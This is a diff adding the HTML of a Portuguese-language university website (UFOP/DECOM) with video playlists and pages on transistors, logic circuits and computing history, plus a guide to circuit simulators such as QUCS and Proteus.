+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554967286-60 nav nav-mark" data-silex-id="silex-id-1439554967286-60" style="" href="#!page-transistor">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">
+                        <font size="3"><b>transistor</b></font>
+                    </div>
+                </div>
+            </a>
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554966975-57 nav nav-mark" data-silex-id="silex-id-1439554966975-57" href="#!page-circuitos">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">
+                        <font size="3"><b>circuitos</b></font><br></div>
+                </div>
+            </a>
+
+
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554966767-55 nav nav-mark" data-silex-id="silex-id-1439554966767-55" style="" href="#!page-hist-ria">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">
+                        <font size="3"><b>HISTÓRIA</b></font>
+                    </div>
+                </div>
+            </a>
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554966563-53 nav nav-mark" data-silex-id="silex-id-1439554966563-53" style="" href="#!page-pr-ticas">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;"><span style="color: rgb(153, 153, 153);"><b>PRáTICAS</b></span><br></div>
+
+                </div>
+            </a>
+
+
+
+
+
+
+
+            <div data-silex-type="image" class="editable-style silex-id-1511456964360-1 image-element paged-element page-videoteca" data-silex-id="silex-id-1511456964360-1" style=""><img src="assets/eletronica_para_computacao.gif" class="silex-element-content"></div>
+
+            <div data-silex-type="image" class="editable-style silex-id-1511457333230-3 image-element paged-element page-circuitos page-hist-ria page-transistor page-introdu-o page-avan-ado page-multiplexador page-somador page-pr-ticas" data-silex-id="silex-id-1511457333230-3" style=""><img src="assets/titulo.png" class="silex-element-content"></div>
+            <a target="_blank" data-silex-type="image" class="editable-style image-element hide-on-mobile silex-id-1513122470808-4 page-pr-ticas paged-element" data-silex-id="silex-id-1513122470808-4" style="" href="//www.decom.ufop.br/"><img src="assets/ufop-icon.png" class="silex-element-content"></a>
+        </div>
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490694237194-15 section-element paged-element page-hist-ria" data-silex-id="silex-id-1490694237194-15">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490694237193-14 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490694237193-14">
+
+
+
+            <div data-silex-type="html" class="editable-style silex-id-1512185022822-1 html-element" data-silex-id="silex-id-1512185022822-1" style="">
+                <div class="silex-element-content">A HISTORIA DA COMPUTAÇÃO
+
+                    <iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" gesture="media" allow="encrypted-media" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpacywQ8YwR6HxrvkNyL8bw3U" assets="" height="315" frameborder="0" width="560"></iframe> Sessão 1. Os primeiros Computadores.
+
+                    <iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" gesture="media" allow="encrypted-media" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpafzKcta36CGnrAeMrAD37MR" assets="" height="315" frameborder="0" width="560"></iframe> Sessão 2. Tecnologias Eletrônicas Antigas
+
+                    <iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" gesture="media" allow="encrypted-media" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpaegLKskiR535P5cLv2leoKo" assets="" height="315" frameborder="0" width="560"></iframe> Sessão 3. PONG, o primeiro video game
+
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1512602572618-3" data-silex-id="silex-id-1512602572618-3" style="">
+                <div class="silex-element-content normal">
+                    <h1><span style="font-family: Roboto;">Curiosidade: Fatos Históricos.<br></span></h1>
+
+                </div>
+            </div>
+
+
+
+            <div data-silex-type="image" class="editable-style image-element silex-id-1512921316348-7" data-silex-id="silex-id-1512921316348-7" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+        </div>
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490694217944-13 section-element paged-element page-circuitos" data-silex-id="silex-id-1490694217944-13">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490694217944-12 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490694217944-12">
+
+
+
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1512602405066-1" data-silex-id="silex-id-1512602405066-1" style="">
+                <div class="silex-element-content normal">
+                    <h1><span style="font-family: Roboto;">Introdução: Circuitos Lógicos.<br></span></h1>
+                    <p>Seja bem vindo à segunda parte.<br></p>
+                </div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1511979427565-3 html-element" data-silex-id="silex-id-1511979427565-3" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/SW2Bwc17_wA?rel=0" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1511979322581-2 html-element" data-silex-id="silex-id-1511979322581-2" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/tz62t-q_KEc?rel=0" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+
+
+            <div data-silex-type="text" class="editable-style silex-id-1512759597414-4 text-element" data-silex-id="silex-id-1512759597414-4" style="">
+                <div class="silex-element-content normal">1. Continuação: Mais informações sobre o transistor...<br><br>2. Outros componentes eletrônicos.<br><br>3. Projetos de circuitos (iniciante)<br><br>4. Portas lógicas, primeira parte.<br><br>RESUMO:<br><br>5. Coleção Eletrônica Kit com
+                    CD.
+                    <br><br>6. Vamos aprender eletrônica na prática?<br></div>
+            </div>
+
+
+            <div data-silex-type="image" class="editable-style image-element silex-id-1512921306178-6" data-silex-id="silex-id-1512921306178-6" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+        </div>
+    </div>
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490693798023-5 section-element paged-element hide-on-mobile page-videoteca page-introdu-o page-avan-ado" data-silex-id="silex-id-1490693798023-5">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490693798022-4 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490693798022-4">
+
+
+
+            <div data-silex-type="container" class="editable-style container-element silex-id-1439554966458-52" data-silex-id="silex-id-1439554966458-52" style="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                <div data-silex-type="container" class="editable-style container-element main-picture paged-element silex-id-1439554965638-44 page-introdu-o page-avan-ado" data-silex-id="silex-id-1439554965638-44">
+
+
+
+
+
+
+
+
+                </div>
+
+
+
+
+                <a data-silex-type="container" class="editable-style container-element sub-nav silex-id-1439554966357-51 hide-on-mobile" data-silex-id="silex-id-1439554966357-51" style="" href="#!page-introdu-o">
+
+
+
+
+
+                    <div data-silex-type="text" class="editable-style text-element silex-id-1439554966255-50 page-link-active" data-silex-href="#!page-videoteca" data-silex-id="silex-id-1439554966255-50" style="">
+                        <div class="silex-element-content normal">
+                            <div style="text-align: center;">
+                                <font size="4">
+                                    <b>
+                            </b>
+                                    <b>INTRODUÇÃO</b>
+                                    <b>
+                        </b>
+                                </font>
+                            </div>
+                        </div>
+                    </div>
+                    <div data-silex-type="image" class="editable-style silex-id-1512342781231-8 image-element hide-on-mobile" data-silex-id="silex-id-1512342781231-8" style=""><img src="assets/mosfet.png" class="silex-element-content"></div>
+                </a>
+
+
+                <div data-silex-type="image" class="editable-style silex-id-1512056199657-5 image-element page-videoteca paged-element" data-silex-id="silex-id-1512056199657-5" style=""><img src="assets/placa_mae_3D.jpg" class="silex-element-content"></div>
+                <a data-silex-type="container" class="editable-style container-element sub-nav silex-id-1439554966154-49 hide-on-mobile page-link-active" data-silex-id="silex-id-1439554966154-49" style="" href="#!page-videoteca">
+
+
+
+
+
+                    <div data-silex-type="text" class="editable-style text-element silex-id-1439554966050-48" data-silex-id="silex-id-1439554966050-48" style="">
+                        <div class="silex-element-content normal">
+                            <h1 style="text-align: center; height: 0px;" class="normal">
+                                <font class="heading1" face="arial, sans-serif" size="6"><span style="font-family: Roboto;">Videoteca</span><br></font>
+                            </h1>
+                        </div>
+                    </div>
+                </a>
+                <a data-silex-type="container" class="editable-style container-element sub-nav silex-id-1439554965843-46 hide-on-mobile" data-silex-id="silex-id-1439554965843-46" style="" href="#!page-avan-ado">
+
+
+
+
+
+
+
+                    <div data-silex-type="text" class="editable-style text-element silex-id-1439554965740-45 page-link-active" data-silex-href="#!page-videoteca" data-silex-id="silex-id-1439554965740-45" style="">
+                        <div class="silex-element-content normal">
+                            <div style="text-align: center;"><b><font size="4">AVANÇADO</font></b><br></div>
+                        </div>
+                    </div>
+                    <div data-silex-type="image" class="editable-style silex-id-1512342804697-9 image-element hide-on-mobile" data-silex-id="silex-id-1512342804697-9" style=""><img src="assets/flipflop.png" class="silex-element-content"></div>
+                </a>
+                <div data-silex-type="container" class="editable-style silex-id-1512338041889-2 container-element" data-silex-id="silex-id-1512338041889-2" style="">
+
+                    <div data-silex-type="text" class="editable-style silex-id-1512338173986-3 text-element page-videoteca paged-element" data-silex-id="silex-id-1512338173986-3" style="">
+                        <div class="silex-element-content normal">
+                            <p style="text-align: center;"><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"></span><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);" class="normal"></span><span style="background-color: rgb(0, 0, 0);"><font size="5">VIDEOTECA do DECOM,</font></span></span></span></font></b></p>
+                            <p style="text-align: center;"><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);"><span style="background-color: rgb(0, 0, 0);"><u><font size="5">Objeto Instrucional para o Aprendizado de Eletrônica.</font></u></span><br></span></span></span></font></b></p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">Este site é resultado do <a href="//www.prograd.ufop.br/index.php/nap/pro-ativa">programa Pró-Ativa 2017</a> da Universidade Federal de Ouro Preto - UFOP, Departamento de Computação - DECOM.&nbsp; Encontraremos aqui materiais complementares para estudo da disciplina <a href="//www.decom.ufop.br/decom/ensino/disciplina/bcc265/2017-2">BCC265 - Eletrônica para Computação.</a></span></span></span></font></b></p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);"></span></span></span></font></b></p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">Bem vindo! Para começar, selecione "introdução" ou "avançado" no menu ao lado para ser apresentado aos conteúdos deste objeto instrucional.<br></span></span></span></font></b></p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">Orientador: Carlos Frederico M. C. Cavalcanti.</span></span></span></font></b></p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">Coorientador: Fernando Cortez Sica.</span></span></span></font></b><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);"><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);"><br></span></span></span></font></b></span>
+                                </span>
+                                </span>
+                                </font>
+                                </b>
+                            </p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);"><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">Aluno bolsista: Stefano Nogueira de Azevedo.</span></span></span></font></b></span>
+                                </span>
+                                </span>
+                                </font>
+                                </b>
+                            </p>
+                            <p><b><font size="3"><span style="font-family: Roboto;"><span style="color: rgb(255, 255, 255);"><span style="background-color: rgb(0, 0, 0);">
+
+                                </span>
+                                
+                                </span>
+                            </span></font></b></p><b><font size="3"><span style="font-family: Roboto;">
+                        </span></font></b></div>
+                    </div>
+
+
+                    <div data-silex-type="text" class="editable-style text-element silex-id-1512343327799-10 page-introdu-o paged-element hide-on-mobile" data-silex-id="silex-id-1512343327799-10" style="">
+                        <div class="silex-element-content normal">
+                            <p style="text-align: center;">
+                                <font size="3"><span style="font-family: Roboto;"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><b><font size="5">Por onde começar?</font></b></span></span>
+                                    </span>
+                                </font>
+                            </p>
+                            <p style="text-align: center;">
+                                <font size="3"><span style="font-family: Roboto;"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><b><u>O Transistor.</u><br></b></span></span>
+                                    </span>
+                                </font>
+                            </p>
+                            <p>
+                                <font size="3"><span style="font-family: Roboto;"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><b>A primeira parte desta série de vídeos é dedicada aos recém-chegados nesta ciência. O primeiro tópico que costuma gerar dúvidas, mas que você deve dominar para seguir em frente, é o transistor. No menu acima selecione a página "Transistor" para começar seu aprendizado.</b></span></span>
+                                    </span>
+                                </font>
+                            </p>
+                            <p style="text-align: center;">
+                                <font size="3"><span style="font-family: Roboto;"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><b><u><span>&nbsp;Circuitos.</span></u><br></b>
+                                    </span>
+                                    </span>
+                                    </span>
+                                </font>
+                            </p>
+                            <p>
+                                <font size="3"><span style="font-family: Roboto;"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><b>A explicação continua na página "Circuitos" onde você será apresentado aos principais componentes eletrônicos e suas funções para formar os circuitos que utilizaremos em aula.</b></span></span>
+                                    </span>
+                                </font>
+                            </p>
+                            <p>
+                                <font size="3"><span style="background-color: rgb(68, 68, 68);"><span style="color: rgb(255, 255, 0);"><span style="font-family: Roboto;"></span>
+
+                                    </span>
+                                    </span>
+                                </font>
+                            </p>
+                        </div>
+                    </div>
+
+
+
+
+                    <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1512338789950-4 hide-on-mobile" data-silex-id="silex-id-1512338789950-4" style="" href="//www.ufop.br/"><img src="assets/ufop-icon.png" class="silex-element-content"></a>
+                    <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512339447025-5 image-element hide-on-mobile" data-silex-id="silex-id-1512339447025-5" style="" href="//www.decom.ufop.br/"><img src="assets/decom-icon.png" class="silex-element-content"></a>
+                    <div data-silex-type="container" class="editable-style silex-id-1513081353001-0 container-element page-avan-ado paged-element" data-silex-id="silex-id-1513081353001-0" style="">
+                        <div data-silex-type="text" class="editable-style silex-id-1512989192643-0 text-element" data-silex-id="silex-id-1512989192643-0" style="">
+                            <div class="silex-element-content normal">
+                                <h1><span style="background-color: rgb(255, 0, 0);"><span style="color: rgb(255, 255, 255);"><span style="font-family: Days One;"><font size="5">Algumas partes do site</font></span></span>
+                                    </span>
+                                </h1>
+                                <h1><span style="background-color: rgb(255, 0, 0);"><span style="color: rgb(255, 255, 255);"><span style="font-family: Days One;"><font size="5">estão em construção.</font></span></span>
+                                    </span>
+                                </h1>
+                                <p><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(204, 0, 0);"><span style="font-family: Days One;"><font class="normal" size="1"><b><span style="background-color: rgb(255, 0, 0);">Quando você ver este ícone da construção, é uma página com material e/ou navegação incompleta.</span></b><br></font>
+                                    </span>
+                                    </span>
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                        <div data-silex-type="image" class="editable-style silex-id-1512921257529-5 image-element hide-on-mobile" data-silex-id="silex-id-1512921257529-5" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class=""></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="silex-pages">
+        <div data-silex-type="image" data-silex-id="silex-id-hamburger-menu" class="menu-button editable-style silex-id-hamburger-menu image-element page-page-1 paged-element prevent-draggable prevent-resizable"><img alt="open mobile menu" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAoCAYAAAC8cqlMAAAB5UlEQVR42u2ZPWvCUBSGM+UfFO3e3dLu/QN+oKj4EUXRQREEJYgoiCAu6qCogyDo7iJ21UUaKqEgCC4iiEMGB3UVgsnpTWj/wfVK2nvhGbKEPJyT996TMMzPGg6H5mKx+GgkyuWyeTQasb8OTDwef4tEIp8+n+/LYIjJZJJHQiwzm81M6OLDarWqNpsNjEYgEJCy2ewT0+/3TagighElNFAnQT6ft1ARKkJFqMgfFvF4PFpuEwFtdrcRqVarIIoirFYrIiyXSxiPx+B2u/GJBINBuF6vQHopigK1Wg2fCMdxcLlciIuoqgqNRgOfiN1uB3Qwg91uB8fjkQiHwwEmkwne1qLxS0VuKKJle71eh06nQ4Rmswk8z+MVcTqdsNlsQJZlotF7Pp8hk8ngE4lGo/qN7xG/vV4Pb0Xm8zlxkdPpBGgMx/+yJxIJKBQKRMjlcuBwOGhq/Q+RcDgMsViMCFrAuFwu/CKDwQC22y1IkkSE/X4PgiDo+xc2Ea0S9zjGa/Hb7Xbxifj9fj0K7yFSqVTwtlY6nYbpdKpPiSRYLBbQarX0PYymFhWhIlSEilCRW6GdyUqlkoVZr9dsKpXiOY6TtW+7BkNBz/7ebrcf9L+6Xq+XRYPMMyrTq5EIhUIvaAjTJb4BBNQ2yhnth0wAAAAASUVORK5CYII=" class="silex-element-content"></div><a id="page-videoteca" data-silex-type="page" class="page-element page-link-active">Videoteca</a><a id="page-introdu-o" data-silex-type="page" class="page-element">Introdução</a><a id="page-avan-ado" data-silex-type="page" class="page-element">Avançado</a><a id="page-transistor" data-silex-type="page" class="page-element">Transistor</a><a id="page-circuitos" data-silex-type="page" class="page-element">Circuitos</a><a id="page-hist-ria" data-silex-type="page" class="page-element">História</a>
+        <a id="page-pr-ticas" data-silex-type="page" class="page-element">Práticas</a><a id="page-multiplexador" data-silex-type="page" class="page-element">Multiplexador</a><a id="page-somador" data-silex-type="page" class="page-element">Somador</a>
+        <a id="page-guia-1" data-silex-type="page" class="page-element">Guia 1</a><a id="page-guia-2" data-silex-type="page" class="page-element">Guia 2</a><a id="page-guia-3" data-silex-type="page" class="page-element">Guia 3</a></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490694258064-17 section-element paged-element page-pr-ticas" data-silex-id="silex-id-1490694258064-17">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490694258062-16 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490694258062-16">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1513122470852-5" data-silex-id="silex-id-1513122470852-5" style="" href="//www.decom.ufop.br/"><img src="assets/decom-icon.png" class="silex-element-content"></a>
+            <div data-silex-type="html" class="editable-style silex-id-1513123156292-8 html-element" data-silex-id="silex-id-1513123156292-8" style="">
+                <div class="silex-element-content">
+                    <p><br><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" eletronica="" master="" index.htmlhttps:="" index.htmlassets="" src="" allowfullscreen="allowfullscreen" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpacU7dplfiFiTTT3_qhmY0TU" assets="" height="315" frameborder="0" width="560"></iframe></p>
+                    <p style="text-align: center;"><span style="color: #ffffff;">Como aprender eletrônica na prática?</span></p>
+                    <p style="text-align: center;"><span style="color: #ffffff;">Um curso de consertos de equipamentos eletrônicos de autoria de Luís Carlos Burgos, técnico e professor de eletrônica.<br></span></p>
+                    <p style="text-align: center;"><span style="color: #ffffff;">8 vídeos, duração total: 67 minutos.</span></p>
+                    <p style="text-align: center;"><span style="color: #ffffff;">Idioma: Português.</span></p>
+                    <p style="text-align: center;"><span style="color: #ffffff;"><a style="color: #ffffff;" href="https://barbolux.github.io/eletronica/#!page-sinopses-parte-1-">Clique para acessar a ficha com descrição completa dessa lista.</a></span></p>
+                </div>
+            </div>
+            <div data-silex-type="image" class="editable-style image-element silex-id-1512921358227-8" data-silex-id="silex-id-1512921358227-8" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+            <div data-silex-type="container" class="editable-style silex-id-1513121329634-0 container-element" data-silex-id="silex-id-1513121329634-0" style="">
+
+
+
+
+
+
+
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512920756348-2 image-element" data-silex-id="silex-id-1512920756348-2" style="" href="https://easyeda.com/pt"><img src="assets/easyeda-icon.png" class="silex-element-content"></a>
+
+
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512920717248-0 image-element" data-silex-id="silex-id-1512920717248-0" style="" href="https://www.circuitlab.com/"><img src="assets/circuitlab-icon.png" class="silex-element-content"></a>
+                <div data-silex-type="image" class="editable-style silex-id-1513129975895-0 image-element" data-silex-id="silex-id-1513129975895-0" style=""><img src="assets/qucs-icon.png" class="silex-element-content"></div>
+                <div data-silex-type="image" class="editable-style silex-id-1513171711615-0 image-element" data-silex-id="silex-id-1513171711615-0" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+                <div data-silex-type="text" class="editable-style silex-id-1512219191042-1 text-element" data-silex-id="silex-id-1512219191042-1" style="">
+                    <div class="silex-element-content normal">
+                        <h1 class="heading1"><span style="font-family: Sintony;">Bem vindo ao</span></h1>
+                        <h1 class="heading1"><span style="font-family: Sintony;">CANAL LASCA ONLINE</span></h1><span style="font-family: Sintony;"><br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; datasheets, projetos, instrumentos <br><br></span>
+                        <h2 class="heading2"><span style="font-family: Sintony;">SIMULADORES</span></h2><span style="font-family: Sintony;"><br>Os simuladores recomendados para as práticas são:<br><br></span>
+                        <h3><span style="font-family: Sintony;"><a href="//qucs.sourceforge.net/">QUCS - Quite Universal Circuit Simulator</a></span></h3>
+                        <span style="font-family: Sintony;">
+                        <font size="1"><span style="font-family: Sintony;"><font size="1">Versão 0.0.19 <i>// 22 de janeiro de 2017<br></i>O QUCS é um simulador de circuitos que é um FOSS (Free Open Source Software) quer dizer, gratuíto e seu código fonte é aberto. O aplicativo está todo traduzido para o idioma português.<br><br>Como abrir o programa: Para rodar o programa no Windows, faça o download do arquivo chamado <a href="https://sourceforge.net/projects/qucs/files/qucs-binary/0.0.19/qucs-0.0.19-win32-mingw482-asco-freehdl-adms.zip/download">qucs-0.0.19-win32-mingw482-asco-freehdl-adms.zip</a>&nbsp; que contém todas os componentes que dependem para seu funcionamento, assim apenas precisa descompactar a pasta e clicar no arquivo qucs para executar (programa do tipo <i>portable</i> que não precisa ser instalado)</font></span></font>
+                        </span><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1">. Nas várias distribuições Linux, é compatível com o Wine (camada de compatibilidade com Windows), basta ir até pasta no terminal e digitar "wine qucs" para executar. Para usuários do sistema MacOSX 10.17, um&nbsp; </font></span></font>
+                        </span><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><a href="https://sourceforge.net/projects/qucs/files/qucs-binary/0.0.19/qucs-0.0.19-OSX10.7.pkg/download">arquivo do tipo pkg está disponível para download</a>.</font></span></font>
+                        </span>
+                        </font>
+                        <font size="1"> Esta versão nova é bem atualizada porque o programa passou a usar um algoritmo de simulação chamado <a href="//asco.sourceforge.net/">ASCO</a> e uma implementação de linguagem de hardware chamada <a href="//freehdl.seul.org/">freeHDL</a>.</font>
+                        </span>
+                        </font>
+                        </span><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><br><br></font></span></font>
+                        </span>Versão 0.0.15 <i>//25 de abril de 2009<br></i>Esta versão é mais antiga, muito leve e estável para um bom desempenho em computadores de dez anos atrás. <a href="https://qucs.br.uptodown.com/windows">Download 5,6MB para Windows 32x</a>                        (compatível com Wine)</font>
+                        <font size="1">.<br><br></font>
+                        </span>
+                        <h3><a href="https://www.labcenter.com/"><span style="font-family: Sintony;"><span class="heading3">PROTEUS Design Suite</span></span></a></h3><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1">Versão 8.7 </font></span>
+                        <span style="font-family: Sintony;">
+                            <font size="1"><span style="font-family: Sintony;"><font size="1"><i>// 28 de fevereiro de 2017</i></font></span></font>
+                        </span>
+                        </font>
+                        </span><span style="font-family: Sintony;"><font size="1"><br>Este programa é pago pois atende ao mercado de profissionais da área de eletrônica. Mas se quiser <a href="https://www.labcenter.com/downloads/">gratuitamente usar a versão Trial para estudantes,</a>
+ há algumas limitações e&nbsp; não dá pra salvar projetos. Mas é boa para 
+experimentar para o aprendizado seus recursos avançados como simulações 
+animadas.<br></font></span><br><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1">Versão 7.9 // </font></span>
+                        <span style="font-family: Sintony;">
+                            <font size="1"><i>5&nbsp;Mar&nbsp;2008<br></i>Legado dessa </font></span></font>
+                        </span><span style="font-family: Sintony;"><font size="1"><a href="https://proteus.informer.com/download/?ca26d55">versão é da época 7x do Proteus</a>,
+ além de ser mais leve, sua compatibilidade com Wine funciona muito bem. O
+ Proteus consiste de dois módulos chamados ISIS e ARES, que são as 
+diferentes partes do simulador.</font></span><span style="font-family: Sintony;"><font size="1"><span style="font-family: Sintony;"><font size="1"><i></i></font></span></font>
+                        </span>
+                        <h3><a href="https://www.labcenter.com/"><span style="font-family: Sintony;"></span></a><span style="font-family: Sintony;"><font size="1"><font class="heading2" size="2">Simuladores Online (Software na "Nuvem")</font></font></span></h3>
+                        <h3><span style="font-family: Sintony;"><font class="normal" size="1">Podemos recomendar dois: <a href="https://easyeda.com/pt">EasyEDA</a>                    e CircuitLab que rodam diretamente no seu browser.</font></span>
+                            <span style="font-family: Sintony;"></span>
+                        </h3>
+                    </div>
+                </div>
+                <div data-silex-type="image" class="editable-style silex-id-1513128345042-0 image-element" data-silex-id="silex-id-1513128345042-0" style=""><img src="assets/proteus-icon.jpg" class="silex-element-content"></div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1513128756158-1 html-element" data-silex-id="silex-id-1513128756158-1" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" eletronica="" master="" index.htmlhttps:="" index.htmlassets="" src="" gesture="media" allow="encrypted-media" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/We6ZEEZ74ak?rel=0&amp;showinfo=0" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490694152451-11 section-element paged-element page-transistor" data-silex-id="silex-id-1490694152451-11">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490694152449-10 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490694152449-10">
+            <div data-silex-type="html" class="editable-style html-element silex-id-1513421038768-5" data-silex-id="silex-id-1513421038768-5" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" eletronica="" master="" index.htmlhttps:="" index.htmlassets="" src="" allowfullscreen="allowfullscreen" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpadCfhigGNIAc3CuSU6cewsO" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+            <div data-silex-type="html" class="editable-style html-element silex-id-1513421037002-4" data-silex-id="silex-id-1513421037002-4" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" eletronica="" master="" index.htmlhttps:="" index.htmlassets="" src="" allowfullscreen="allowfullscreen" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpafmlGM_I_blK2ycKqqVYc6B" assets="" height="315" frameborder="0" width="560"></iframe></div>
